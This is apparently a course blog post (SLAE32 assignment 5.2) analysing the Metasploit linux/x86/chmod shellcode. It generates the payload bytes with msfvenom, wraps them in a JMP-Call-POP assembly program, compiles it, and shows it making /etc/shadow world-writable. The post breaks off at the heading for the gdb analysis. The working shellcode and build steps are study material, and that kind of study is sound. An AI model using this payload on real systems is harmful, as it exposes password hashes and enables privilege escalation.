---
title: SLAE32 Assignment 5.2 -- Analyzing chmod Shellcode
date: 2019-9-15
layout: single
classes: wide
tags:
  - msfvenom
  - metasploit
  - chmod
  - assembly
  - SLAE
  - linux
  - x86
  - shellcode
--- 
![](/assets/images/SLAE32.png)
## Overview
For the fifth assignment in the SLAE32 course we were tasked with analyzing three shellcodes from the Metasploit Framework.  
In this blog post we will be analyzing the `linux/x86/chmod` payload.  
This shellcode will change the permissions of the file `/etc/shadow` on the victims device allowing any and all users to read & write to the file.  
There are much easier ways of creating an executable to test the shellcode than what is shown here. Instead we could have used the C program provided, output the shellcode into a file, or piped the payload to the analysis program.  
The method of adding the shellcode to our own `JMP|Call|POP` Assembly program was used to gain a better grasp on the assembly concepts.  
### Settings for the MSF chmod payload
```console
root# msfvenom --payload linux/x86/chmod --list-options
Name  Current Setting  Required  Description
----  ---------------  --------  -----------
FILE  /etc/shadow      yes       Filename to chmod
MODE  0666             yes       File mode (octal)

Description:
  Runs chmod on specified file with specified mode
```

## Preparing the Shellcode for `gdb` & `disasm` Analysis
### Generating the `chmod` Shellcode
+ We will export the shellcode to the python format.
  -  This will allow us to add the shellcode to our python script for formatting.
+ Once we generate the correct format for our shellcode, we will add it to our `JMP|Call|POP` assembly program.
  - This will allow us to easily analyze the shellcode with `gdb` and `disasm`.

```console
root@zed# msfvenom -p linux/x86/chmod --format python 2>/dev/null | \
> egrep "^buf " | sed -e 's/buf /sc /g'
sc =  ""
sc += "\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74"
sc += "\x63\x2f\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01"
sc += "\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80"
```
### Formatting the Shellcode for Assembly Compilation
+ We will copy the `sc` python variable generated above, and add it to our python script.
+ Typically `msfvenom` generates the shellcode in the `\x99` we see above.
+ We need the shellcode to be in the `0x99,` format.
  - Assembly requires we use the `0x99,` format for assigning a hex string to memory.
#### Our Python Script to Format the Hex Code
```python
#!/usr/bin/python
# Filename: formatHex.py
# Author:   boku
# Purpose:  A python script that converts the '\x' format to '0x ,'

# Add the shellcode hex here.
sc =  ""
sc += "\x99\x6a\x0f\x58\x52\xe8\x0c\x00\x00\x00\x2f\x65\x74"
sc += "\x63\x2f\x73\x68\x61\x64\x6f\x77\x00\x5b\x68\xb6\x01"
sc += "\x00\x00\x59\xcd\x80\x6a\x01\x58\xcd\x80"

output = ""
print 'Encoded shellcode ...'
for x in bytearray(sc) :
        output += '0x'
        output += '%02x,' %x
print output
```

#### Generating the Hex in the `0x ,` Format
+ The `\<Return>` at the end was added after for formatting.
  - This format does work when compiling shellcode with `nasm`.
  - Nasm does not seem to care about `<space>` characters either.

```console
root# python formatHex.py
Encoded shellcode ...
0x99,0x6a,0x0f,0x58,0x52,0xe8,0x0c,\
0x00,0x00,0x00,0x2f,0x65,0x74,0x63,0x2f,0x73,\
0x68,0x61,0x64,0x6f,0x77,0x00,0x5b,0x68,0xb6,\
0x01,0x00,0x00,0x59,0xcd,0x80,0x6a,0x01,0x58,\
0xcd,0x80
```
### Adding the Shellcode to our `JMP|Call|POP` Assembly Program
+ To get nasm syntax highlighting in Vim I used the command `:set syn=nasm`.

```nasm
; Filename: jmpCallPop.nasm
; Author:  Bobby Cooke
global _start
section .text
_start:
; 1. Jump to where our Shellcode string is
  jmp short call_shellcode
decoder:
  pop esi
jmp2_shellcode:
; 3. Now that the memory location of our string is on the top of the
;     stack, we will pass control to it using the jmp instruction.
  pop eax
  jmp eax
call_shellcode:
; 2. Call to the instruction that will jump us into our Shellcode
;    - Call is like jump, but stores the memory location of the next
;       instruction onto the Stack; which is our Shellcode.
  call jmp2_shellcode
  shellcode: db 0x99,0x6a,0x0f,0x58,0x52,0xe8,0x0c,\
      0x00,0x00,0x00,0x2f,0x65,0x74,0x63,0x2f,0x73,\
      0x68,0x61,0x64,0x6f,0x77,0x00,0x5b,0x68,0xb6,\
      0x01,0x00,0x00,0x59,0xcd,0x80,0x6a,0x01,0x58,\
      0xcd,0x80
```
### Compiling our JMP|Call|POP Shellcode
```console
root# nasm -f elf32 jmpCallPop.nasm -o jmpCallPop.o
root# ld jmpCallPop.o -o jmpCallPop
```
### Testing our chmod Shellcode
+ The payload will change the file `/etc/shadow` to the permissions `rw-rw-rw-`.
```console
root# ls -l /etc/shadow
-rw-r----- 1 root shadow 1074 Sep  3 11:17 /etc/shadow
root# ./jmpCallPop
root# ls -l /etc/shadow
-rw-rw-rw- 1 root shadow 1074 Sep  3 11:17 /etc/shadow
```
Great! Our payload works as intended. Now lets set a breakpoint and analyze the shellcode with `gdb`.

## Analyzing the Shellcode with `gdb`
